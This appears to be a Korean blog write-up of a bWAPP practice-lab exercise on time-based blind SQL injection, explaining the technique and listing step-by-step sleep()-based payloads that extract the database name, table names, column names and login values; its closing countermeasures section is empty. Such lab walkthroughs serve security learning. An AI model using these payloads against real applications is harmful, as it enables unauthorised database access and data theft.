---
title: "[bWAPP] 1. Injection - SQL Injection - Blind - Time-Based"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## SQL Injection

응용 프로그램 보안 상의 허점을 의도적으로 이용해, 

임의의 SQL문을 주입하여 악의적인 SQL문을 실행하게 함으로써

DB를 비정상적으로 조작하는 코드 인젝션의 대표적인 공격.

이로인해 공격자가 DB에 저장되어 있는 다른 사용자의 개인 정보 등 허가되지 않은 정보에 접근하여,

데이터 변조 및 조작 가능.

<br>

<br>

## Blind Injection

Blind SQL Injection으로 많이 사용

SQL인젝션 공격에는 쿼리 조건을 무력화하여 인증을 우회하거나,쿼리 결과에 정보를 붙여서 데이터를 유출하거나 시스템 명령어를 삽입하는 형태로 공격이 진행

하지만, 공격하는 대상 웹페이지가 어떤 오류도 출력하지 않고 쿼리 겨로가 리스트도 제공하지 않는다면 

Blind SQL Injection으로 쿼리 결과의 참/거짓을 통해 DB 값 유출해 내는 기법

<br>

### Time - Based

앞서 영화검색에서는 검색 결과의 유,무로만 참/거짓을 판별할 수 있었는데

어떤 경우애는 응답의 결과가 항상 동일하여 응답 결과만으로는 참/거짓을 판별할 수 없는 경우가 있다.

이럴 때는 시간을 지연시키는 쿼리를 주입하여 응답 시간의 차이로 참/거짓을 판별할 수 있는데

이 때 사용하는 공격기법이 Blind - Time SQL Injection 이다.

![image-20220317020316667](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317020316667.png)

- 참 거짓을 sleep 함수를 이용해 구분해보자

![image-20220317020532247](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317020532247.png)

- 참일 때 슬립이 걸리고

![image-20220317020555024](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317020555024.png)

- 거짓일 때는 걸리지 않는다.
- 이를 이용해서 Boolean-Based 와 같이 length, 대소문자구분, 대조를 통해 진행해보자

<BR>

### DB 조회

![image-20220317020736145](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317020736145.png)

`' or length(database())=1 and sleep(1)#`

- DB의 길이 구해주고

`' or ascii(substring(database(),1,1))>96 and sleep(1)#`

- 문자를 알아내야 하는데, ascii 명령어를 통해 대문자인지 소문자인지를 먼저 구분하고

`' or substring(database(),1,1)='a' and sleep(1)#`

- substring 명령어를 통해 database의 첫번쨰 위치의 길이 1값이 a가 맞는지 확인한다.

```sql
SUBSTR(str, pos, len)
```

- str에서 pos 번째 위치의 len개의 문자를 읽어 들임

`' or database()='bWAPP' and sleep(1)#`

- 그리고 마지막에 DB가 bWAPP이 맞는지 체크

<BR>

### 테이블 조회

![image-20220317021056545](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317021056545.png)

`' or length((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1))=4 and sleep(1)#`

- 길이 구해주고

`' or ascii(substring(select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1),1,1))>96 and sleep(1) #`

- 대소문자 구분

`' or substring((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1),1,1)='a' and sleep(1) #`

- 문자 대조
- DB 처럼 bWAPP 이 맞는지 체크해줘도 된다.
- 난 안함 귀찮아서..(사실 함)

<BR>

### 컬럼 조회

![image-20220317021355018](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317021355018.png)

`' or length((select column_name from information_schema.columns where table_name='heroes' limit 0,1))=1 and sleep(1)#`

- 길이

`' or ascii(substring(select column_name from information_schema.columns where table_name='heroes' limit 0,1),1,1))>96 and sleep(1) #`

- 대소문자

`' or substring(select column_name from information_schema.columns where table_name='heroes' limit 0,1),1,1)='a' and sleep(1) #`

- 대조
- 말이 점점 짧아진다... 미안하다.

<BR>

### 컬럼 속성

![image-20220317021548387](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317021548387.png)

`' or length((select login from heroes limit 0,1))=3 and sleep(1)#`

- ㄱㅇ... 길이
- 거의 다 왔다 힘내자 친구들

`' or ascii(substring((select login from heroes limit 0,1),1,1))>96 and sleep(1)#`

- 말안해도 알지?
- 혹시 몰라 대소문자..

`' or substring((select login from heroes limit 0,1),1,1)='a' and sleep(1) #`

- 대조
- 끝까지 온 친구들의 노고에 박수를 보낸다.

<BR>

<BR>

## 대응방안

